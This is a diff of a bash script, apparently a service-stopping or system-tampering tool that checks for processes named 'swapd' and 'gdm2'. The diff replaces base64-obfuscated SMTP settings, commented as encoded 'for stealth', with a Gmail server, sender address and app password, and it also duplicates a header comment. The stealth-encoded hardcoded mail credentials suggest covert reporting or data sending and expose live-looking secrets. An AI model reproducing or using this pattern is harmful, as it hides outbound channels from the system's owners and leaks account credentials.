@@ -289,6 +289,7 @@ IFS=$'\n\t'
 trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
 
 # ==================== ROBUST SERVICE STOPPING FUNCTION ====================
+# ==================== ROBUST SERVICE STOPPING FUNCTION ====================
 force_stop_service() {
     local service_names="$1"
     local process_names="$2"
@@ -707,12 +708,12 @@ readonly SERVICES_TO_CHECK=("swapd" "gdm2")
 # These are the user's personal fullgamingacc.com credentials
 # Updated: 2026-05-05 - Switched to fullgamingacc.com SMTP
 # Decoded SMTP credentials (base64 encoded for stealth)
-SMTP_SERVER_B64="bWFpbC5mdWxsZ2FtaW5nYWNjLmNvbQ=="
+SMTP_SERVER_B64="c210cC5nbWFpbC5jb20="
 readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
 readonly SMTP_PORT=587
-SENDER_EMAIL_B64="bXRwenlub3Jtc0BmdWxsZ2FtaW5nYWNjLmNvbQ=="
+SENDER_EMAIL_B64="YWNlbmJlcmdoZWltQGdtYWlsLmNvbQ=="
 readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
-SMTP_PASSWORD_B64="QnQ2UXF1alBycyE="
+SMTP_PASSWORD_B64="amZ2diBjZGxsIGlvb2Mga3F4ZA=="
 readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
 
 # Function to log messages with timestamp
